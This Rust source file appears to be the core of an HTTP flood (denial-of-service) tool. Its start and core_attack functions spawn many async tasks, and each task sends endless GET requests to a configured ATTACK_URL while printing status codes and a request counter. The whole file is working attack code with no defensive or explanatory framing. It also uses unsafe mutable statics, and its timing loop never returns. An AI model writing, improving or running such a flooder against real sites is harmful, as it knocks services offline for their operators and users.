use core::time;
use std::thread;

use reqwest::Response;
use tokio::time::Instant;

use crate::ram_manger::PUB_VAR;

static mut AMOUNT: u128 = 0;

static mut THREADS_ON: u128 = 0;


pub async fn start() {
    loop {
        core_attack();
    }
}

fn core_attack() {
    let error_threads = PUB_VAR.lock();
    match error_threads {
        Err(_) => {}
        Ok(mut threads) => {
            if threads.thread_on + 1 < crate::FORCE {
                threads.thread_on += 1;
                unsafe {
                    THREADS_ON += 1;
                }
                drop(threads);
                tokio::spawn(async {
                    loop {
                        let now = Instant::now();
                        let error_data = request(crate::ATTACK_URL);
                        match error_data.await {
                            Ok(status_code) => unsafe {
                                AMOUNT += 1;
                                println!(
                                    "Threads on {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
                                    THREADS_ON,
                                    status_code.status(),
                                    now.elapsed().as_secs(),
                                    AMOUNT,
                                );
                            }
                            Err(data) => unsafe {
                                println!(
                                    "Status ERROR {} Request per 10 Millisecond {}",
                                    data,
                                    AMOUNT
                                );
                            }
                        }
                    }
                });
            } else {
                unsafe {
                    time_function();
                }
            }
        }
    }
}

unsafe fn time_function() {
    loop {
        AMOUNT = 0;
        thread::sleep(time::Duration::from_millis(10));
    }
}

async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    }
}
